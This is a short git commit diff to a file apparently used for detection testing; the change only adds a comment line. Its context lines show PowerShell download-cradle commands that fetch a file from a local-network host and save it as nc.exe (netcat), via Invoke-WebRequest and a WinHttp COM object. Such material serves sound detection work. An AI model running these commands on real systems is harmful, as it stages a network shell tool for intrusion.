e8f700c0806932281b756cbc8c830bde87770301
i0xid <97521668+kostya300@users.noreply.github.com>
2024-01-27 13:49:00 +0500

    Update DetectionWinHttpRequest1.sh

--- DetectionWinHttpRequest1.sh
+++ DetectionWinHttpRequest1.sh
@@ -3,7 +3,7 @@ Detection:
 Invoke-WebRequest http://192.168.0.101:8000/t.txt -OutFile "C:\Users\Public\nc.exe" 
 
 
-
+Commnds on the powershell below 
 $h=new-object -com WinHttp.WinHttpRequest.5.1
 $h.open('GET','http://192.168.0.101:8000/t.txt',$false);
 $h.send();
